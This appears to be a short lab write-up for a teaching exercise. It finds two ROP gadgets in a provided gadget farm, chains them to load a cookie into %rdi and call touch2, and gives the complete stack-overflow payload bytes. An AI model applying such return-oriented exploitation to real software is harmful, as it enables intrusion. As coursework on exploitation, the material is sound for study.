# Finding the Gadgets

If we can do it in two instructions, we probably need to pop into a register, and move that register to %rdi.
`popq` are `58-5f` for `%rax-%rdi`, and all movs are `48 89 XX`.

So the structure of the exploit is:

```asm
...0000 popq gadget
...0008 popq value
...0010 mov gadget
...0018 touch2 addr
```

addval_273 ends in `48 89 c7 c3 c3` and can be used for moving.
addval_219 ends in `58 90 c3` and can be used for popping.

popq gadget is addval_219 + 4 = `00 00 00 00 00 40 19 ab` in big endian.
popq value is cookie            `00 00 00 00 59 b9 97 fa` in big endian.
mov gadget is addval_273 + 2 =  `00 00 00 00 00 40 19 a2` in big endian.
touch2 addr is                  `00 00 00 00 00 40 17 ec` in big endian.

The solution then must be to put this into the stack at the link register.
Stack is allocated w/ +0x28, so we need to start with 5 qwords.

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

